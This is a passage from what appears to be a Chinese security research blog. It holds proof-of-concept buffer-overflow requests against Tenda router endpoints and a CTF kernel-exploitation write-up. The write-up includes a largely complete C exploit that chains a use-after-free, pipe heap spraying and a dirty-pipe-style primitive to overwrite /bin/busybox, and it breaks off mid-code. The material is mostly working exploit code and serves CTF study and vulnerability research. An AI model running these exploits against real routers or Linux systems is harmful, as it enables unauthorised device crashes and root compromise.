<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">ip = <span class="string">&quot;192.168.85.143&quot;</span></span><br><span class="line">url = <span class="string">&quot;http://&quot;</span> + ip + <span class="string">&quot;/goform/WrlExtraGet&quot;</span></span><br><span class="line"></span><br><span class="line">data = &#123;</span><br><span class="line">    <span class="string">&quot;chkHz&quot;</span>: <span class="string">&quot;a&quot;</span> * <span class="number">0x4000</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">response = requests.<span class="built_in">post</span>(url, data=data)</span><br><span class="line"><span class="built_in">print</span>(response.text)</span><br></pre></td></tr></table></figure>

<h2 id="AC10U-v1-0"><a href="#AC10U-v1-0" class="headerlink" title="AC10U v1.0"></a>AC10U v1.0</h2><p><a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-2708">CVE-2024-2708</a></p>
<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">A vulnerability was found in Tenda AC10U 15.03.06.49 and classified as critical. This issue affects the function formexeCommand of the file /goform/execCommand. The manipulation of the argument cmdinput leads to stack-based buffer overflow. The attack may be initiated remotely. The exploit has been disclosed to the public and may be used. The associated identifier of this vulnerability is VDB-257459. NOTE: The vendor was contacted early about this disclosure but did not respond in any way.</span><br></pre></td></tr></table></figure>

<p>下载固件，测试。<a href="https://www.tendacn.com/download/detail-3795.html">AC10U v1.0 Firmware</a></p>
<p>依然是MIPS LSB，patch 3处</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 1</span></span><br><span class="line">lw      $gp, <span class="number">0x138</span>+<span class="built_in">var_120</span>($fp)</span><br><span class="line">la      $v0, apmib_init</span><br><span class="line">move    $t9, $v0</span><br><span class="line">li      $v0, <span class="number">1</span>           # Keypatch modified <span class="keyword">this</span> from:</span><br><span class="line">                         <span class="meta">#   jalr $t9 # apmib_init</span></span><br><span class="line">nop                      # Keypatch modified <span class="keyword">this</span> from:</span><br><span class="line">                         <span class="meta">#   nop</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 2</span></span><br><span class="line">addiu   $v0, $fp, <span class="number">0x138</span>+ipbuf</span><br><span class="line">move    $a0, $v0</span><br><span class="line">la      $v0, check_network</span><br><span class="line">move    $t9, $v0</span><br><span class="line">li      $v0, <span class="number">1</span>           # Keypatch modified <span class="keyword">this</span> from:</span><br><span class="line">                         <span class="meta">#   jalr $t9 # check_network</span></span><br><span class="line">nop</span><br><span class="line"></span><br><span class="line"><span class="comment">// 3</span></span><br><span class="line">la      $v0, sleep</span><br><span class="line">move    $t9, $v0</span><br><span class="line">jalr    $t9  <span class="meta"># sleep</span></span><br><span class="line">nop</span><br><span class="line">lw      $gp, <span class="number">0x138</span>+<span class="built_in">var_120</span>($fp)</span><br><span class="line">la      $v0, ConnectCfm</span><br><span class="line">move    $t9, $v0</span><br><span class="line">li      $v0, <span class="number">1</span>           # Keypatch modified <span class="keyword">this</span> from:</span><br><span class="line">                         <span class="meta">#   jalr $t9 # ConnectCfm</span></span><br><span class="line">nop                      # Keypatch modified <span class="keyword">this</span> from:</span><br><span class="line">                         <span class="meta">#   nop</span></span><br></pre></td></tr></table></figure>

<p>测试溢出</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">ip = <span class="string">&quot;192.168.84.101&quot;</span></span><br><span class="line">url = <span class="string">&quot;http://%s/goform/execCommand&quot;</span>%ip</span><br><span class="line">cookie = &#123;<span class="string">&quot;Cookie&quot;</span>:<span class="string">&quot;cmdinput=&quot;</span> + <span class="string">&quot;A&quot;</span>*<span class="number">1000</span>&#125;</span><br><span class="line">ret = requests.get(url=url,cookies=cookie)</span><br><span class="line"><span class="built_in">print</span>(ret.text)</span><br></pre></td></tr></table></figure>

<p>复现时？看了一眼，没注册路由？？？</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;html&gt;&lt;<span class="built_in">head</span>&gt;&lt;title&gt;Document Error: Data follows&lt;/title&gt;&lt;/head&gt;</span><br><span class="line">		&lt;body&gt;&lt;h2&gt;Access Error: Data follows&lt;/h2&gt;</span><br><span class="line">		&lt;p&gt;Form exeCommand is not defined&lt;/p&gt;&lt;/body&gt;&lt;/html&gt;</span><br></pre></td></tr></table></figure>


<h2 id="CVE申请"><a href="#CVE申请" class="headerlink" title="CVE申请"></a>CVE申请</h2><p>这些产品 <code>unsupported</code>，因此公布没什么问题， 直接向CVE网站报告就行</p>
<ul>
<li>这里需要注意，正在卖钱的产品最好还是向官方报告。</li>
</ul>
<p>参考这篇文章就行：<a href="https://www.sqlsec.com/2021/06/cve.html#%E7%BC%96%E5%86%99%E7%BB%86%E8%8A%82">水一篇文章：如何水一个 CVE</a></p>
<p>申请了两个CVE（等待了两个星期）</p>
<ul>
<li>CVE-2024-44858</li>
<li>CVE-2024-44859</li>
</ul>
<p>以后多看看新出的CVE，看看能不能捡漏😋</p>
<p>刷CVE找很久没更新的并且有点年代感的固件，狠狠的刷🥵</p>
<ul>
<li>httpd</li>
<li>cgi</li>
<li>WEB 服务</li>
</ul>
<p>并且做IoT还是得需要硬件支持，否则测试蛮难受的。<del>焊板子挺有趣，但是我只是个穷学生😭，还是用qemu</del></p>
]]></content>
  </entry>
  <entry>
    <title>mimic-water-ker</title>
    <url>/2023/11/11/mimic-water-ker/</url>
    <content><![CDATA[<blockquote>
<p>差点抄明白了</p>
</blockquote>
<span id="more"></span>

<h2 id="water-ker"><a href="#water-ker" class="headerlink" title="water-ker"></a>water-ker</h2><p>内核题目，权限正确，保护全开，唯一不好的就是没有提供 <code>.config</code> 文件</p>
<p>运行时保护全开，查看 LKM</p>
<ul>
<li>创建一个chunk。</li>
<li>可以free，并且存在UAF。</li>
<li>可以 edit 1字节。</li>
</ul>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">water_ioctl</span><span class="params">(file *file, <span class="type">unsigned</span> <span class="type">int</span> cmd, <span class="type">unsigned</span> __int64 arg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v3; <span class="comment">// rbp</span></span><br><span class="line">  __int64 arg_; <span class="comment">// rdx</span></span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line">  edit_args args; <span class="comment">// [rsp+0h] [rbp-18h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v7; <span class="comment">// [rsp+8h] [rbp-10h]</span></span><br><span class="line">  __int64 v8; <span class="comment">// [rsp+10h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  _fentry__();</span><br><span class="line">  v8 = v3;</span><br><span class="line">  v7 = __readgsqword(<span class="number">0x28</span>u);</span><br><span class="line">  result = <span class="number">0LL</span>;</span><br><span class="line">  <span class="keyword">switch</span> ( cmd )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0x30</span>u:</span><br><span class="line">      <span class="keyword">if</span> ( !<span class="built_in">copy_from_user</span>(&amp;args, arg_, <span class="number">8LL</span>) )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( delete_idx &lt;= <span class="number">0</span> &amp;&amp; chunk )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="built_in">kfree</span>();                              <span class="comment">// uaf dangling pointer</span></span><br><span class="line">                                                <span class="comment">// chunk = 0</span></span><br><span class="line">          ++delete_idx;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0xFFFFFFFFFFFFFFEA</span>LL;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0x50</span>u:</span><br><span class="line">      <span class="keyword">if</span> ( !<span class="built_in">copy_from_user</span>(&amp;args, arg_, <span class="number">8LL</span>) )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( edit_idx &lt;= <span class="number">0</span> &amp;&amp; chunk &amp;&amp; !<span class="built_in">copy_from_user</span>(chunk, args.buf, <span class="number">1LL</span>) )<span class="comment">// pipe pages</span></span><br><span class="line">        &#123;</span><br><span class="line">          ++edit_idx;</span><br><span class="line">          <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0xFFFFFFFFFFFFFFEA</span>LL;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0x20</span>u:</span><br><span class="line">      <span class="keyword">if</span> ( !<span class="built_in">copy_from_user</span>(&amp;args, arg_, <span class="number">8LL</span>) )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( !chunk )</span><br><span class="line">        &#123;                                       <span class="comment">// void *kmalloc_trace(struct kmem_cache *s, gfp_t flags, size_t size)</span></span><br><span class="line">          chunk = (<span class="type">unsigned</span> __int8 *)<span class="built_in">kmalloc_trace</span>(kmalloc_caches[<span class="number">51</span>], <span class="number">4197568LL</span>, <span class="number">0x200</span>LL);</span><br><span class="line">          <span class="keyword">if</span> ( chunk )</span><br><span class="line">          &#123;</span><br><span class="line">            <span class="built_in">copy_from_user</span>(chunk, args.buf, <span class="number">0x200</span>LL);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0xFFFFFFFFFFFFFFEA</span>LL;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>chunk的flag，不是 <code>SLAB_ACCOUNT 0x04000000</code>，因此是 通用slab。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">chunk = (<span class="type">unsigned</span> __int8 *)<span class="built_in">kmalloc_trace</span>(kmalloc_caches[<span class="number">51</span>], <span class="number">0x400CC0</span>LL, <span class="number">0x200</span>LL);</span><br></pre></td></tr></table></figure>

<p>思路是使用 pipe 结构体的 page 指针，造成任意读写。</p>
<ul>
<li>fcntl 修改 pipe 的size从而可以获得0x200大小的 <code>pipe_bufs ring</code></li>
<li>uaf 修改 <code>pipe_buffer-&gt;pages</code> 使两个page指针指向同一个内存</li>
<li>free 一个 page 可以使用另一个page任意读写</li>
<li>堆喷射提高成功率</li>
<li>page 使用kmalloc-64。0x40</li>
</ul>
<p>gdb调试，使用脚本</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># gdbscript</span><br><span class="line">file vmlinux  # 需要先去除 kaslr 否则地址偏移不对，无法debug</span><br><span class="line">target remote :1234</span><br><span class="line"></span><br><span class="line"># cmd</span><br><span class="line">gdb -x gdbscript</span><br></pre></td></tr></table></figure>

<h3 id="page-level-uaf"><a href="#page-level-uaf" class="headerlink" title="page-level-uaf"></a>page-level-uaf</h3><p>pipe 结构体<code>struct pipe_inode_info (size ?= 0x88)</code> 成员 <code>pipe-&gt;bufs</code>  的成员默认为 10(pipe_bufs &amp;&amp; ring_size)个 <code>struct pipe_buffer</code> ，此结构体第一个成员变量为 <code>struct page *page</code></p>
<ul>
<li>堆喷射大量的pipe，然后使用 <code>pipe_fcntl</code> 修改  <code>ring_size</code>  的大小，让 <code>pipe-&gt;bufs</code> 处于 kmalloc-512。</li>
<li>将部分的 <code>pipe_bufs</code> 修改大，这样会获得比较多的 free 掉的 kmalloc-512</li>
<li>添加chunk然后free掉，处于kmalloc-512。</li>
<li>使用<code>fcntl</code> 将改大的 <code>pipe_bufs</code> 改回 kmalloc-512。</li>
<li>往pipe中写内容，<code>alloc_pages</code> 获得页。</li>
<li>因为存在uaf，edit 修改page指针的最后一个字节，使两个 pipe （victim, origin） 指向相同的 struct page</li>
<li><code>struct page</code> 的大小约为 0x40，直接修改 <code>\x00</code> 成功率 <code>75%</code>。0x100 &#x2F; 0x40 &#x3D; 4，可能根本就没修改，存在失败的可能性。</li>
</ul>
<p>如果我们 close origin pipe ，可以获得 uaf 的 page</p>
<h3 id="二级-page-level-uaf-构造自写管道"><a href="#二级-page-level-uaf-构造自写管道" class="headerlink" title="二级 page-level-uaf 构造自写管道"></a>二级 page-level-uaf 构造自写管道</h3><p>上一步close后，存在一个存在 uaf 的 page，我们几乎可以任意读写。这里我们可以继续使用 <code>pipe_buffer</code> 结构体，在close pipe。</p>
<ul>
<li>堆喷大量的 pipe</li>
<li>close origin pipe，获得 free page 1</li>
<li>fcntl 修改大小，总有在free page 1 的 pipe，我们可以使用 victim 读取内容，获得page 1上的pipe内容</li>
<li>然后对 free page 1上的 pipe_buffer 进行 类似 uaf 写一字节的效果，使 page 1 的两个 pipe_buffer 的 page 指向同一个地方</li>
<li>free page 1 的其中一个 pipe，获得一个 uaf 的 free page 2</li>
<li>使用 pipe_buffer 进行获取，进行读写，但是这里修改free page 2 pipe_buffer page指针为  free page 1 的pipe_buffer 的 page。</li>
</ul>
<p>来自a3✌博客的原图。</p>
<p><img src="https://s2.loli.net/2023/05/02/TYr8WlEushem2i3.png" alt="二级自写管道"></p>
<h3 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h3><p>读写管道内容：需要先往管道中写内容，才能读取管道内容。这是 <code>struct pipe_buffer</code> 本身的属性  <code>offset &amp; len</code> 决定的。</p>
<ul>
<li>offset 开始读取，最多读len长度</li>
<li>从 offset + len 地方开始写内容</li>
</ul>
<p>为什么选择 96 和 192 的 size</p>
<ul>
<li>kmalloc存在这两个大小的 kmem_cache。</li>
<li>这两个size在 kmalloc 中也是比较独特的存在，不是2的幂次方，但是内核中很多的结构体大小类似，因此专门存在这两个size</li>
</ul>
<p>kfree 没有size参数？先找page 结构体，不是 slab page 就释放 page，是slab page 释放 object 大小的内容</p>
<h4 id="pipe-primitive"><a href="#pipe-primitive" class="headerlink" title="pipe primitive"></a>pipe primitive</h4><p>dirty pipe ，大致就是 <code>struct pipe_buffer</code> 的 flag 存在一个属性： <code>PIPE_BUF_FLAG_CAN_MERGE</code> ，结合 <code>splice</code> 0拷贝，可以写入<strong>任意可读文件</strong>。</p>
<p>我们主要思路就是：改pipe的flag，实现不依赖地址的内核提权。</p>
<p>在内核提权过程中，覆盖 <code>/bin/busybox</code> 文件，可以写二级制shellcode 或者 bash 脚本，随便执行命令就行，因为都是 busybox 的 link。</p>
<ul>
<li>问题：如果shell写成 <code>/bin/cat /flag</code> ，因为我们改了busybox实现，会出现 <code>Too many levels of symbolic links</code> 的错误提示</li>
<li>别忘记关闭文件描述符🤣。</li>
<li>还有的问题就写在注释里了</li>
</ul>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * musl-gcc water.c -static -masm=intel -o exp</span></span><br><span class="line"><span class="comment"> * strip exp</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sched.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/prctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PIPE_SPRAY_NUMS 120</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SND_PIPE_SPRAY_NUMS 80</span></span><br><span class="line"><span class="comment">// kmalloc-cg-96</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SND_PIPE_BUFS_SIZE 96</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PIPE_BUF_FLAG_CAN_MERGE 0x10</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> log_info(fmt, ...) \</span></span><br><span class="line"><span class="meta">  dprintf(2, <span class="string">&quot;\033[32m[+] &quot;</span> fmt <span class="string">&quot;\033[0m\n&quot;</span>, ##__VA_ARGS__)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">page</span>;</span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">pipe_inode_info</span>;</span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">pipe_buf_operations</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">pipe_buffer</span> &#123;</span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">page</span> *page;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> offset, len;</span><br><span class="line">  <span class="type">const</span> <span class="keyword">struct</span> <span class="title class_">pipe_buf_operations</span> *ops;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> flags;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">long</span> <span class="keyword">private</span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">pipe_buf_operations</span> &#123;</span><br><span class="line">  <span class="built_in">int</span> (*confirm)(<span class="keyword">struct</span> pipe_inode_info *, <span class="keyword">struct</span> pipe_buffer *);</span><br><span class="line">  <span class="built_in">void</span> (*release)(<span class="keyword">struct</span> pipe_inode_info *, <span class="keyword">struct</span> pipe_buffer *);</span><br><span class="line">  <span class="built_in">int</span> (*try_steal)(<span class="keyword">struct</span> pipe_inode_info *, <span class="keyword">struct</span> pipe_buffer *);</span><br><span class="line">  <span class="built_in">int</span> (*get)(<span class="keyword">struct</span> pipe_inode_info *, <span class="keyword">struct</span> pipe_buffer *);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> kernel_base = <span class="number">0xffffffff81000000</span>;</span><br><span class="line"><span class="type">size_t</span> kernel_offset = <span class="number">0</span>;</span><br><span class="line"><span class="type">int</span> spray_pipe_fd[PIPE_SPRAY_NUMS][<span class="number">2</span>];</span><br><span class="line"><span class="type">int</span> dev_fd;</span><br><span class="line"><span class="type">int</span> victim_idx = <span class="number">-1</span>, origin_idx = <span class="number">-1</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">char</span> target_file[] = <span class="string">&quot;/bin/busybox&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">char</span> payload[] = <span class="string">&quot;#!/tmp/sh\n /tmp/cat /flag\n&quot;</span>;</span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">pipe_buffer</span> info_pipe_buf = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">water_args</span> &#123;</span><br><span class="line">  <span class="type">char</span> *buf;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">new_chunk</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="type">char</span> buffer[<span class="number">512</span>];</span><br><span class="line">  <span class="built_in">memset</span>(buffer, <span class="number">0x44</span>, <span class="built_in">sizeof</span>(buffer));</span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">water_args</span> arg = &#123;</span><br><span class="line">      .buf = buffer,</span><br><span class="line">  &#125;;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">ioctl</span>(dev_fd, <span class="number">0x20</span>, &amp;arg);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">delete_chunk</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">water_args</span> arg = &#123;</span><br><span class="line">      .buf = <span class="literal">NULL</span>,</span><br><span class="line">  &#125;;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">ioctl</span>(dev_fd, <span class="number">0x30</span>, &amp;arg);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">edit_chunk</span><span class="params">(<span class="type">char</span> c)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">water_args</span> arg = &#123;</span><br><span class="line">      .buf = &amp;c,</span><br><span class="line">  &#125;;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">ioctl</span>(dev_fd, <span class="number">0x50</span>, &amp;arg);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">err_exit</span><span class="params">(<span class="type">char</span> *msg)</span> </span>&#123;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;[-] error: %s&quot;</span>, msg);</span><br><span class="line">  <span class="built_in">sleep</span>(<span class="number">5</span>);</span><br><span class="line">  <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">debug</span><span class="params">(<span class="type">char</span> *msg)</span> </span>&#123;</span><br><span class="line">  <span class="built_in">puts</span>(msg);</span><br><span class="line">  <span class="built_in">getchar</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">page_level_uaf</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="built_in">log_info</span>(<span class="string">&quot;spray pipe&quot;</span>);</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; PIPE_SPRAY_NUMS; ++i) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">pipe</span>(spray_pipe_fd[i]) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">      <span class="built_in">err_exit</span>(<span class="string">&quot;pipe&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="built_in">log_info</span>(<span class="string">&quot;change ring_size make pipe-&gt;bufs kmalloc-512 &quot;</span>);</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; PIPE_SPRAY_NUMS; i ++) &#123;</span><br><span class="line">    <span class="built_in">fcntl</span>(spray_pipe_fd[i][<span class="number">1</span>], F_SETPIPE_SZ, <span class="number">0x1000</span> * <span class="number">8</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">log_info</span>(<span class="string">&quot;kmalloc-512 hole&quot;</span>);</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; PIPE_SPRAY_NUMS; i += <span class="number">2</span>) &#123;</span><br><span class="line">    <span class="built_in">fcntl</span>(spray_pipe_fd[i][<span class="number">1</span>], F_SETPIPE_SZ, <span class="number">0x1000</span> * <span class="number">16</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">log_info</span>(<span class="string">&quot;new chunk then free&quot;</span>);</span><br><span class="line">  <span class="built_in">new_chunk</span>();</span><br><span class="line">  <span class="built_in">debug</span>(<span class="string">&quot;write chunk data D&quot;</span>);</span><br><span class="line">  <span class="built_in">delete_chunk</span>();</span><br><span class="line"></span><br><span class="line">  <span class="built_in">log_info</span>(<span class="string">&quot;fill the hole&quot;</span>);</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; PIPE_SPRAY_NUMS; i += <span class="number">2</span>) &#123;</span><br><span class="line">    <span class="built_in">fcntl</span>(spray_pipe_fd[i][<span class="number">1</span>], F_SETPIPE_SZ, <span class="number">0x1000</span> * <span class="number">8</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">log_info</span>(<span class="string">&quot;alloc pipe_buffer pages&quot;</span>);</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; PIPE_SPRAY_NUMS; i++) &#123;</span><br><span class="line">    <span class="built_in">write</span>(spray_pipe_fd[i][<span class="number">1</span>], <span class="string">&quot;deadbeef&quot;</span>, <span class="number">0x8</span>);</span><br><span class="line">    <span class="built_in">write</span>(spray_pipe_fd[i][<span class="number">1</span>], &amp;i, <span class="built_in">sizeof</span>(<span class="type">int</span>));</span><br><span class="line">    <span class="built_in">write</span>(spray_pipe_fd[i][<span class="number">1</span>], &amp;i, <span class="built_in">sizeof</span>(<span class="type">int</span>));</span><br><span class="line">    <span class="built_in">write</span>(spray_pipe_fd[i][<span class="number">1</span>], &amp;i, <span class="built_in">sizeof</span>(<span class="type">int</span>));</span><br><span class="line">    <span class="built_in">write</span>(spray_pipe_fd[i][<span class="number">1</span>], <span class="string">&quot;deadbeef&quot;</span>, <span class="number">0x8</span>);</span><br><span class="line">    <span class="built_in">write</span>(spray_pipe_fd[i][<span class="number">1</span>], <span class="string">&quot;deadbeef&quot;</span>, <span class="number">0x8</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">log_info</span>(<span class="string">&quot;uaf change pipe-&gt;bufs-&gt;page&quot;</span>);</span><br><span class="line">  <span class="built_in">edit_chunk</span>(<span class="number">0x00</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">log_info</span>(<span class="string">&quot;find victim pipe&quot;</span>);</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; PIPE_SPRAY_NUMS; i++) &#123;</span><br><span class="line">    <span class="type">char</span> tags[<span class="number">0x10</span>];</span><br><span class="line">    <span class="type">int</span> nr;</span><br><span class="line">    <span class="built_in">memset</span>(tags, <span class="number">0</span>, <span class="built_in">sizeof</span>(tags));</span><br><span class="line">    <span class="built_in">read</span>(spray_pipe_fd[i][<span class="number">0</span>], tags, <span class="number">8</span>);</span><br><span class="line">    <span class="built_in">read</span>(spray_pipe_fd[i][<span class="number">0</span>], &amp;nr, <span class="built_in">sizeof</span>(<span class="type">int</span>));</span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(tags, <span class="string">&quot;deadbeef&quot;</span>) &amp;&amp; nr != i) &#123;</span><br><span class="line">      origin_idx = nr;</span><br><span class="line">      victim_idx = i;</span><br><span class="line">      <span class="built_in">log_info</span>(<span class="string">&quot;succeed find victim: %d, origin: %d&quot;</span>, victim_idx, origin_idx);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (victim_idx == <span class="number">-1</span> || origin_idx == <span class="number">-1</span>) &#123;</span><br><span class="line">    <span class="built_in">err_exit</span>(<span class="string">&quot;find idx&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">pipe_primitive</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="type">char</span> buffer[<span class="number">0x400</span>];</span><br><span class="line">  <span class="type">int</span> snd_pipe_fd[SND_PIPE_SPRAY_NUMS][<span class="number">2</span>];</span><br><span class="line">  <span class="type">int</span> target_fd;</span><br><span class="line">  <span class="type">size_t</span> snd_pipe_sz;</span><br><span class="line">  <span class="keyword">if</span> ((target_fd = <span class="built_in">open</span>(target_file, O_RDONLY)) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="built_in">err_exit</span>(<span class="string">&quot;open /bin/busybox&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  snd_pipe_sz = <span class="number">0x1000</span> * (SND_PIPE_BUFS_SIZE / <span class="built_in">sizeof</span>(<span class="keyword">struct</span> pipe_buffer));</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; SND_PIPE_SPRAY_NUMS; i++) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">pipe</span>(snd_pipe_fd[i]) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">      <span class="built_in">err_exit</span>(<span class="string">&quot;pipe&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">log_info</span>(<span class="string">&quot;write pipe then we can read&quot;</span>);</span><br><span class="line">  <span class="comment">// ? 因为我们在find victim 写了 3 个 字符串 和 3个 sizeof(int) 导致</span></span><br><span class="line">  <span class="built_in">write</span>(spray_pipe_fd[victim_idx][<span class="number">1</span>], buffer, SND_PIPE_BUFS_SIZE * <span class="number">2</span> - <span class="number">24</span> - <span class="number">3</span> * <span class="built_in">sizeof</span>(<span class="type">int</span>));</span><br><span class="line"></span><br><span class="line">  <span class="built_in">log_info</span>(<span class="string">&quot;free origin pipe&quot;</span>);</span><br><span class="line">  <span class="built_in">close</span>(spray_pipe_fd[origin_idx][<span class="number">0</span>]);</span><br><span class="line">  <span class="built_in">close</span>(spray_pipe_fd[origin_idx][<span 